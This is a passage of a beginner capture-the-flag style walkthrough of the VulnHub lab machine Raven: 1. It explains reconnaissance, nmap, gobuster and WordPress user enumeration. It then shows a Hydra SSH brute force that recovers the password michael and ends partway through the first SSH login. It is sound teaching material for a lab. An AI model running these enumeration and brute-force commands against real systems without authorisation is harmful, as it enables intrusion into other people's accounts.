# Raven: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Raven: 1 |
| **Difficulty** | Beginner / Intermediate (four flags, two intended root paths) |
| **Author** | William McCann |
| **Released** | 14 August 2018 |
| **VulnHub Entry** | <https://vulnhub.com/entry/raven-1,256/> |
| **Download** | <https://vulnhub.com/entry/raven-1,256/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Debian 8 "jessie" (Apache 2.4.10, WordPress 4.8.x, MySQL 5.5) |
| **Flags** | 4 — flag1 (website), flag2 (`/var/www`), flag3 (`wp_posts`), flag4 (`/root`) |

> **Note:** VMware/VirtualBox builds vary ("varies by build") — the WordPress
> version shows as 4.8.7 or 4.8.18 depending on the release, and flag file
> locations can shift. The chain below is the intended one. **There are four
> flags** to collect.

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are
> about to do. They are the point of this document — the commands are only the
> demonstration. If a box refers to background you do not have, it links to
> [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide primer on
> fundamentals.
>
> **If you have never done a box before**, read
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first)
> and
> [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)
> first. Ten minutes there saves hours of confusion here.

---

## 0. What you will learn

- What **reconnaissance** and **enumeration** actually mean, and why they are
  separate activities with separate goals.
- What **nmap** is doing at the packet level when it "scans a port".
- What a **wordlist** is, where `rockyou.txt` came from, and why a targeted list
  beats a big one.
- How to enumerate a web server hosting **WordPress** and **phpMyAdmin**.
- How WordPress leaks **usernames** through `/?author=N`, and how `wpscan`
  automates that.
- How to **brute-force SSH** with `hydra` when a user reuses a trivial password.
- How to read **`wp-config.php`** for database credentials and reuse them to log
  into **MySQL**.
- What a **password hash** is, why it cannot be reversed, and how WordPress's
  `$P$` (phpass) hashes are cracked with John the Ripper.
- What **`sudo`** rights are, how to read `sudo -l` output precisely, and what
  **GTFOBins** is.
- What a **SUID** binary is and why an interpreter with the SUID bit means root.
- Two ways to root this box:
  1. **`sudo python`** with no restrictions (a GTFOBins escape), and
  2. a **MySQL UDF** ("User Defined Function") shared library to run commands
     **as root**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali must be on the same host-only/NAT
network as the target. Add `raven.local` to `/etc/hosts`.

---

## 1. Reconnaissance — finding the target

> ### 📖 Concept — What is "reconnaissance"?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow:
> you are drawing a map, not attacking a position. The word is borrowed directly
> from the military — send scouts to look at the terrain before committing
> troops.
>
> Recon splits into two kinds:
>
> | | **Passive** | **Active** |
> | --- | --- | --- |
> | Does the target see you? | **No** — you never send it a packet | **Yes** — every probe is logged |
> | Sources | Search engines, WHOIS, DNS records, `crt.sh` certificate transparency, Shodan, GitHub, LinkedIn | `netdiscover`, `nmap`, `gobuster`, `hydra` |
> | Where VulnHub sits | Barely relevant — there is no company to research | **This is your whole job** |
>
> On a lab box, "reconnaissance" almost always means one thing: **find the
> target's IP address.** That is what this section does.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance)

> **Goal:** discover the target IP on the lab subnet (DHCP — confirm every time).

### 1.1 What is my own address?

You cannot find anyone else until you know where *you* are.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:4e:66:a1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:8c:4f:22 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth1
```

> **How to read it.** Each numbered block is a network interface.
> - `eth0` holds `192.168.56.10/24`. The **`/24`** is CIDR notation meaning the
>   netmask is `255.255.255.0` — the first 24 bits are the *network* and the last
>   8 bits are the *host*, so this subnet spans `192.168.56.0`–`192.168.56.255`.
>   This is VirtualBox's **host-only** adapter: your lab network.
> - `eth1` holds `10.0.2.15/24`. That is VirtualBox's **NAT** adapter — Kali's
>   route to the internet, *not* to the lab.
>
> **The target must be on `eth0`'s subnet.** If it is not, nothing in this
> document will work and you have a networking configuration problem, not a
> hacking problem.
>
> A shorter version of the same command, which is what most people actually use:
>
> ```bash
> ip -br a
> ```
>
> ```text
> lo               UNKNOWN        127.0.0.1/8 ::1/128
> eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
> eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
> ```

### 1.2 Who else is alive on the subnet?

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  Cadmus Computer Systems
 192.168.56.10   08:00:27:4e:66:a1      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:12:34:56      2     120  PCS Systemtechnik GmbH
```

> ### 📖 Concept — What just happened? ARP and MAC addresses
>
> `netdiscover` did not send a single TCP packet. It used **ARP** (Address
> Resolution Protocol), which answers the question *"which hardware address owns
> this IP address?"*
>
> A **MAC address** (`08:00:27:12:34:56`) is a physical identifier burned into a
> network card. IP addresses are logical and change; MAC addresses are physical
> and (mostly) do not. ARP works at layer 2, directly on the wire, and **cannot be
> blocked by a host firewall** — which is exactly why it is the most reliable way
> to enumerate a local network. A machine that refuses to answer `ping` will still
> answer ARP.
>
> **Reading the table:**
> - `192.168.56.1` is the **gateway** — VirtualBox's own host-side adapter.
> - `192.168.56.10` is **you**. Recognise your own MAC from `ip a` above.
> - That leaves **`192.168.56.101` as the target.**
>
> **Bonus trick:** the first three octets of a MAC identify the manufacturer.
> `08:00:27` is Oracle **VirtualBox**, `00:0c:29` and `00:50:56` are **VMware**,
> `00:15:5d` is **Hyper-V**. If several hosts are alive and you are unsure which
> is yours, the vendor prefix tells you which are VMs. Always confirm against your
> hypervisor's network settings — **attacking the wrong host is the classic
> beginner error.**
>
> `-r 192.168.56.0/24` gives netdiscover a range to sweep. Without it, the tool
> sits passively waiting to overhear ARP traffic, which can take minutes.
> `sudo` is required because ARP means crafting raw layer-2 frames.
>
> **Deep dive:** [CONCEPTS §2.2 — MAC addresses and ARP](../../docs/CONCEPTS.md#22-mac-addresses-and-arp) and
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

An equivalent, often faster tool:

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4e:66:a1, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:00	(Unknown: locally administered)
192.168.56.101	08:00:27:12:34:56	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.143 seconds (119.46 hosts/sec). 2 responded
```

> If nothing is found: check the VM's adapter is set to **host-only** (not NAT),
> wait 30 seconds for the target to finish booting, and try
> `sudo nmap -sn 192.168.56.0/24` as a second opinion.

**Target IP:** `192.168.56.101`

![Finding the target](images/01-recon.png)

### 1.3 Give the target a hostname

```bash
echo "192.168.56.101 raven.local" | sudo tee -a /etc/hosts
```

```text
192.168.56.101 raven.local
```

> ### 📖 Concept — Why bother with `/etc/hosts`?
>
> `/etc/hosts` is your machine's **local DNS override**. Before consulting a DNS
> server, the resolver checks this file. Adding a line means you can type
> `http://raven.local` instead of an IP.
>
> That is not just convenience — on WordPress boxes it is often **mandatory**.
> WordPress stores its own site URL in the database and generates absolute links
> from it. If the site was built as `http://raven.local` and you browse to
> `http://192.168.56.101`, WordPress will keep redirecting you to `raven.local`,
> which will not resolve, and you will be stuck in a redirect loop with no idea
> why.
>
> The command breakdown: `echo "..."` prints the line, the pipe `|` sends it to
> `sudo tee -a`, and `-a` means **append**. You cannot use `>>` with `sudo`
> because the redirection is performed by your *unprivileged* shell, not by the
> privileged command — it would fail with permission denied. `tee` runs as root
> and does the writing itself.
>
> Verify with `getent hosts raven.local`, which returns `192.168.56.101`.

---

## 2. Enumeration

> ### 📖 Concept — What is "enumeration", and how is it different from scanning?
>
> **Enumeration** is the phase where you interrogate the services you found, to
> extract *specific, actionable detail*: usernames, directory paths, share names,
> software versions, database tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open, Apache 2.4.10" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute
> force a login without a username. You cannot crack a hash you never found. You
> cannot exploit an upload endpoint you do not know the path of. Every successful
> foothold traces back to a fact you enumerated.
>
> This is why every VulnHub author eventually writes "ENUMERATION IS THE KEY" in
> capitals. They are not being decorative — they are telling you which phase you
> are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

### 2.1 Port scan — all ports first

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 15:22 EEST
Nmap scan report for raven.local (192.168.56.101)
Host is up (0.00042s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 41.02 seconds
```

> ### 📖 Concept — What is nmap, and how does a port scan actually work?
>
> **`nmap`** ("Network MAPper") is the standard tool for discovering hosts and the
> services they run. It has no magic: it works by **sending deliberately crafted
> packets and classifying the responses**. Once you understand that, every flag
> becomes predictable.
>
> **A port** is a number 0–65535 identifying *which program* on a host should
> receive a packet. The IP address gets you to the machine; the port gets you to
> the service. Ports 0–1023 are *privileged* — only root can bind them.
>
> **The scan is a conversation.** TCP is connection-oriented, so before any data
> flows the two sides perform a **three-way handshake**:
>
> ```text
>    Kali (attacker)                          Raven (target)
>        |                                        |
>        |--------- SYN (seq=x) ---------------->|  "Can I talk to port 80?"
>        |                                        |
>        |<------ SYN-ACK (seq=y, ack=x+1) ------|  "Yes — something is listening."
>        |                                        |
>        |--------- ACK (ack=y+1) -------------->|  "Established."
>        |                                        |
>        |============ data flows ===============>|
> ```
>
> There are exactly **three** things the target can do, and they map directly onto
> the words in the output above:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host is up, nothing listening there |
> | *(nothing)* or ICMP unreachable | `filtered` | A firewall dropped the packet |
>
> **Reading this output, in order:**
>
> 1. **`Not shown: 65532 closed tcp ports (conn-refused)`** — the line everyone
>    skips and the most information-dense line in the whole scan.
>    `65535 − 65532 = 3` ports are interesting. The parenthetical
>    `(conn-refused)` is the **reason**: the target sent RST packets, so it is up
>    and answering — *not* firewalled. Had it said `(no-response)` you would
>    suspect filtering. Add `--reason` to any scan to see this evidence column
>    explicitly; it is the best learning flag in nmap.
> 2. **`PORT / STATE / SERVICE`** — the findings. Read `STATE` precisely: `open`
>    is exploitable; `open|filtered` means *unproven*.
> 3. **`MAC Address: … (Oracle VirtualBox virtual NIC)`** — confirms this is a VM.
> 4. **`scanned in 41.02 seconds`** — sanity check. A `-p-` scan that finishes in
>    2 seconds probably hit a firewall or the wrong IP.
>
> **The flags, one by one:**
>
> | Flag | What it does | Why here |
> | --- | --- | --- |
> | `-p-` | Scan **all 65535** TCP ports, not just the 1000 most common | The interesting service is often on `:8080`, `:666`, `:31337`. Skipping this is the most common way beginners get stuck. |
> | `--min-rate 1000` | Send at least 1000 packets/second | Makes `-p-` take ~40 s instead of ~10 min |
> | `-T4` | Timing template 4 of 5 | The right answer for labs. **`-T5` misses ports** because it abandons slow replies too early — a *false negative*, which is worse than slow. |
> | `-oA scans/allports` | Write **all three** output formats at once: `.nmap` (text), `.xml` (machine-readable), `.gnmap` (greppable) | You will re-read this hours later. Rescanning is slower and may differ. |
> | `sudo` | Run as root | Root lets nmap craft raw packets, enabling the faster stealthier **SYN scan** (`-sS`). Without root nmap silently falls back to `-sT` (full connect), which the target's *application* logs. |
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

### 2.2 Identify the services

Now that we know *which* ports are open, find out *what* is behind them.

```bash
sudo nmap -sC -sV -p 22,80,111 -oA scans/services 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 15:24 EEST
Nmap scan report for raven.local (192.168.56.101)
Host is up (0.00038s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (RSA)
|   256 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (ECDSA)
|_  256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100005  1,2,3      45231/tcp   mountd
|   100021  1,3,4      39877/tcp   nlockmgr
|_  100024  1          51234/tcp   status
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
```

> ### 📖 Concept — `-sV` and `-sC`: version detection and scripts
>
> **`-sV` (version detection)** answers "*what* is listening on that open port?"
> It does this by:
> 1. Reading any **banner** the service volunteers on connect — FTP and SMTP send
>    one immediately (`220 ProFTPD 1.3.5`). SSH sends its version string first
>    thing, which is why we get `OpenSSH 6.7p1` for free.
> 2. Sending a sequence of probes from nmap's `nmap-service-probes` database and
>    comparing responses against roughly 10,000 known fingerprints.
> 3. Reporting a confidence level.
>
> **`-sC`** runs the NSE (**Nmap Scripting Engine**) scripts in the `default`
> category — safe, informative Lua scripts shipped in `/usr/share/nmap/scripts/`.
> That is where the indented `|`-prefixed lines come from: `ssh-hostkey`,
> `http-title`, `rpcinfo`.
>
> **Why this matters more than it looks.** The version strings are your pivot into
> everything else:
> - `Apache httpd 2.4.10 ((Debian))` → the OS is **Debian**, not Ubuntu.
> - `OpenSSH 6.7p1 Debian 5+deb8u4` → the `deb8u4` suffix pins it to **Debian 8
>   "jessie"**, released 2015, end-of-life 2020.
> - Together they tell you which kernel exploits are plausible and that this
>   system has not been patched in years.
>
> Without `-sV` you know *something* is on port 22. With it, you know exactly what
> to search for. **Never skip `-sV`.**
>
> **Reading the `rpcinfo` block.** Port 111 is **`rpcbind`**, the ONC RPC
> *portmapper*. Old Sun RPC services register their real port here because those
> ports are allocated dynamically — which is why you see NFS on `2049` but
> `mountd` on `45231` and `nlockmgr` on `39877`. The block tells you an **NFS
> server** is present. Worth checking:
>
> ```bash
> showmount -e 192.168.56.101
> ```
>
> ```text
> clnt_create: RPC: Program not registered
> ```
>
> Nothing is actually exported — `rpcbind` is running but has no shares. The
> published writeups confirm this is a **dead end** on Raven: 1. Note it and move
> on; do not spend an hour on a service with nothing behind it. (On
> [HA: Rudra](../ha-rudra/README.md) the same port is the *entire* foothold — the
> difference is what `showmount` returns.)
>
> **Deep dive:** [CONCEPTS §5.2 — Version detection](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work) and
> [§5.4 — NSE scripts](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

![Nmap scan output](images/02-nmap.png)

### 2.3 Look at the website before running any tool

```bash
curl -sI http://raven.local/
```

```text
HTTP/1.1 200 OK
Date: Sat, 11 May 2024 12:26:03 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Tue, 14 Aug 2018 09:12:44 GMT
ETag: "1a2b-5734f8c1a2300"
Accept-Ranges: bytes
Content-Length: 6699
Vary: Accept-Encoding
Content-Type: text/html
```

Browse `http://raven.local` — it is the **"Raven Security"** marketing site, and
its **Blog** link points at `/wordpress/`. There we see posts authored by
**michael**.

> ### 📖 Concept — Why read the page manually first?
>
> Two reasons, and students skip both.
>
> **1. Response headers identify the technology.** Here `Server: Apache/2.4.10
> (Debian)` confirms nmap's fingerprint. On other boxes you will see
> `X-Powered-By: PHP/7.2`, or a `Set-Cookie` header that gives the framework away
> instantly — `PHPSESSID` → PHP, `JSESSIONID` → Java, `laravel_session` →
> Laravel, `csrftoken`+`sessionid` → Django, `connect.sid` → Node/Express.
>
> **2. Humans write hints in prose.** Authors leave sentences in the page body, in
> HTML comments (`Ctrl+U`), in image filenames, in EXIF metadata, and in
> `robots.txt`. Tooling will not tell you *"the admin panel is at /portal and the
> default password is unchanged."* Your eyes will.
>
> Here the page's own **Blog** navigation link hands you `/wordpress/` — and
> author names visible on blog posts are half of every credential pair you will
> need. Notice that we already know the name **michael** before running a single
> scanner. That is enumeration working as intended.
>
> Always check, by hand:
>
> ```bash
> curl -s http://raven.local/ | grep -oE '<!--.*?-->'   # HTML comments
> curl -s http://raven.local/robots.txt                  # paths the owner wanted hidden
> curl -s http://raven.local/sitemap.xml
> ```
>
> **Deep dive:** [CONCEPTS §6.1 — The universal enumeration reflexes](../../docs/CONCEPTS.md#61-the-universal-enumeration-reflexes)

![Web enumeration — finding WordPress](images/03-enum.png)

### 2.4 Web content discovery

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
```

```text
===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://192.168.56.101
[+] Method:                  GET
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Extensions:              php, txt
[+] Threads:                 40
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 6699]
/path                 (Status: 301) [Size: 315] [--> http://192.168.56.101/path/]
/vendor               (Status: 301) [Size: 317] [--> http://192.168.56.101/vendor/]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.56.101/wordpress/]
/server-status        (Status: 403) [Size: 296]
===============================================================
Finished
===============================================================
```

> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that
> exist*. There is no cleverness involved — it is a dictionary attack against the
> URL space. A web server will happily serve anything it has; it does not advertise
> an index of its files. So the tool requests `/admin`, `/backup`,
> `/config.php`, … one at a time, and classifies each response.
>
> A **wordlist** is just a plain text file with one candidate per line. Its power
> comes from an empirical fact about humans: **web directory names are not
> random.** `/admin`, `/backup`, `/phpmyadmin`, `/wp-content` appear on thousands
> of sites, so a curated list of a few thousand words finds things a random-string
> generator of millions never would.
>
> **Where wordlists come from:**
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated. Fast first pass. |
> | **`directory-list-2.3-medium.txt`** | 220,547 | **Used here.** Crawled from real websites by the DirBuster project. |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `SecLists` | huge | The professional standard — install with `apt install seclists` |
>
> **The status codes are the whole result.** Learn them:
>
> | Code | Meaning | What it tells you |
> | --- | --- | --- |
> | **200** | OK | Exists and you can read it |
> | **301** | Moved permanently | Usually a **directory** — it needs a trailing `/`. Note the `-->` target gobuster prints. |
> | **403** | Forbidden | **It exists**, you just may not read it. That is itself an information leak. |
> | **404** | Not found | The baseline — what almost every guess returns |
> | **401** | Unauthorized | Needs credentials. Read the `WWW-Authenticate` header. |
> | **500** | Server error | **Your input broke something** — often means injection |
>
> > **`401` vs `403` is the distinction that matters most.** `401` = "I do not know
> > who you are" (*authenticate*). `403` = "I know who you are and you may not"
> > (*authorise*). A `403` proves the resource exists.
>
> **The flags:**
>
> | Flag | Meaning |
> | --- | --- |
> | `dir` | The gobuster *mode* (others: `dns`, `vhost`, `s3`, `tftp`) |
> | `-u` | Target URL |
> | `-w` | **W**ordlist path |
> | `-x php,txt` | Also try these **extensions**. This is the difference between finding nothing and finding everything — `/secret` 404s but `/secret.txt` 200s. **If a scan comes back empty, change the extension list before you change the wordlist.** |
> | `-t 40` | **T**hreads — parallel requests. Higher is faster but noisier and can destabilise a lab VM. |
>
> `/vendor` is worth a look — on this box it is the Bootstrap/PHP library directory
> from the site template, and it confirms the site is hand-built PHP rather than
> a single CMS.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) and
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

### 2.5 Enumerate WordPress users

```bash
wpscan --url http://raven.local/wordpress/ -e u --disable-tls-checks
```

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
_______________________________________________________________

[+] URL: http://raven.local/wordpress/ [192.168.56.101]
[+] Started: Sat May 11 15:31:08 2024

[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://raven.local/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=4.8.7</generator>

[+] WordPress theme in use: twentysixteen

[+] Enumerating Users (via Passive and Aggressive Methods)

[i] User(s) Identified:

[+] michael
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Finished: Sat May 11 15:31:24 2024
[+] Requests Done: 61
[+] Memory used: 168.313 MB
```

> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> http://raven.local/wordpress/?author=1   →  301 → /wordpress/author/michael/
> http://raven.local/wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID is sequential from 1 and the redirect target contains the **username**.
> `wpscan -e u` simply loops the IDs until they stop resolving. Try it by hand in
> a browser — watching the redirect happen is worth more than reading about it.
>
> Notice wpscan labels its methods, and the labels matter:
> - **Passive Detection** — inferred from data the site publishes anyway (RSS
>   feeds, author bylines). The site does not notice.
> - **Aggressive Detection** — wpscan actively probed (brute-forcing author IDs,
>   submitting bad logins to read the error message). This generates log entries.
>
> `steven` was found *only* aggressively and has no public posts. That is exactly
> the kind of account that gets forgotten — and it is the one that turns out to
> hold the escalation path.
>
> **The `-e` flag controls what to enumerate:**
>
> | Value | Enumerates |
> | --- | --- |
> | **`u`** | **Users** — used here |
> | `p` | **Plugins** — the most common WordPress compromise vector |
> | `t` | Themes |
> | `vp` / `vt` | Only *vulnerable* plugins / themes |
> | `cb` | Config backups (`wp-config.php.bak` — a jackpot if present) |
> | `dbe` | Database exports |
>
> Here we use `-e u` because the objective is a **password** attack, which needs
> usernames. On a box where the CMS is out of date, run `-e u,p,t,vp` and check
> every plugin against Exploit-DB.
>
> `--disable-tls-checks` silences certificate validation — harmless on HTTP, and
> needed on labs with self-signed HTTPS.
>
> **Why usernames are half the battle:** you can now attack `wp-login.php` and SSH
> with two known-good usernames instead of guessing both halves of the pair.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

---

## 3. Foothold

> ### 📖 Concept — What does "foothold" mean?
>
> A **foothold** is your first execution of code on the target — usually a shell
> running as a **low-privileged service account** like `www-data`, not as root and
> not as a real person. It is called a foothold because it is a position to push
> off *from*, not a destination. Almost nothing useful can be done from it
> directly; its value is that it lets you enumerate the machine **from the
> inside**, which reveals attack surface an external scan never could.
>
> On this box the foothold comes from the least glamorous vulnerability there is:
> **a user whose password equals his username.**

### 3.1 SSH brute force (weak password)

The users' names are good candidates, so test "username as password" and a
wordlist:

```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt -e nsr -I ssh://192.168.56.101
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 15:40:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3 login tries (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.56.101:22/
[22][ssh] host: 192.168.56.101   login: michael   password: michael
[STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 15:40:13
```

> ### 📖 Concept — What is Hydra doing, and where does `rockyou.txt` come from?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, telnet, SNMP…) and simply tries
> credential combinations until one is accepted. There is no exploit and no
> cleverness — it is a very fast, very patient guesser.
>
> **The flags:**
>
> | Flag | Meaning |
> | --- | --- |
> | `-l michael` | Single **l**ogin name (lowercase `-L` would be a *file* of usernames) |
> | `-P rockyou.txt` | **P**assword list (uppercase `-P` = file; lowercase `-p` = one password) |
> | `-e nsr` | Also try three extra cases: **n** = null/empty password, **s** = the login name itself as the password, **r** = the login name **reversed** |
> | `-I` | **I**gnore any stale `hydra.restore` file so the run starts clean |
> | `ssh://…` | The service module. Choosing the wrong module is the most common Hydra mistake. |
>
> **`-e nsr` is what won this box**, and it won it in **one second** — before
> `rockyou.txt` was even meaningfully consulted. Michael's password was literally
> `michael`. That is why `-e nsr` should be on every Hydra run: the three cheapest
> guesses in existence are empty, the username, and the reversed username, and
> they succeed astonishingly often on CTF boxes and on real neglected accounts.
>
> **Where `rockyou.txt` comes from.** In 2009 the social-networking site RockYou
> was breached. They had stored **32 million passwords in plaintext** — no hashing
> at all. The dump became the single most-used password list in security, because
> it is not theoretical: it is what real people actually chose. It contains
> 14,344,392 entries, **ordered by observed frequency**, so the top of the file is
> disproportionately valuable.
>
> On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt
> ```
>
> ```text
> 14344392 rockyou.txt
> ```
>
> **A wordlist is not a brute force.** These are different attacks with different
> costs and different detection profiles:
>
> | Attack | What it tries | Speed |
> | --- | --- | --- |
> | **Wordlist** | Every entry in a curated list | Fast, high hit rate |
> | **Brute force** | Every character combination | Astronomically slow |
> | **Password spraying** | **One** password against **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | Real leaked `user:pass` **pairs** | Exploits password reuse |
>
> > ⚠️ **A caution about this command.** Pointing Hydra at all 14 million lines of
> > `rockyou.txt` over SSH would take *days* and generate millions of failed logins
> > in `/var/log/auth.log`. That is fine on a lab VM you own. On a real system it
> > would be an obvious, logged denial-of-service-grade event. Professionals use
> > `-t 4` to throttle, a short targeted list, and spray rather than hammer.
> >
> > In practice, on this box you would get the answer in one second from `-e nsr`
> > and `Ctrl+C` the rest.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) and
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

### 3.2 Log in and grab flag 2

```bash
ssh michael@192.168.56.101
```

```text
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ECDSA key fingerprint is SHA256:31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
michael@192.168.56.101's password: michael
Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 14 10:22:31 2018 from 192.168.56.1
michael@Raven:~$
```

> **Why the fingerprint prompt?** SSH uses **TOFU** — *trust on first use*. The
> first time you connect, it cannot know the host's key, so it shows you the
> fingerprint and asks you to accept it. It records the answer in
